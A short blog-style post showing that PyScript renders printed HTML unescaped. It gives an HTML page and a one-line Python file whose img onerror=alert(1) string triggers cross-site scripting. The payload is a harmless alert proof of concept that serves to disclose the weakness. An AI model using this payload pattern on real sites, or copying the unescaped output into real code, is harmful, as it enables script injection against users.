# Run XSS in Your browser
## With additional steps

## Intro
Sometime ago, I mean week, Anaconda, release the PyScript https://github.com/pyscript/pyscript. Simplifing: The Python in browser, with HTML and JavaScript. Javascript and python, in the browser,. What can possibly can go wrong. 

DISCLAIMER: Since the PyScript is not intendent for big projects, the value of security might be less obvious to many people. Especially as it tend to be simplier and easier to develop, orientated towards fast development. 

## PyScript XSS
Let's check how it works:
index.html
```
<!DOCTYPE html>
<html>
    <head>
        <link rel="stylesheet" href="https://pyscript.net/alpha/pyscript.css" />
        <script defer src="https://pyscript.net/alpha/pyscript.js"></script>
    </head>
    <body>
        <py-script src="/test.py"></py-script>
    </body>
</html>
```
test.py
```
print('as<img src=x onerror=alert(1)>df')
```
and here we are, with XSS. 

## Outro
Make no mistake, The PyScript, is brilliant product!
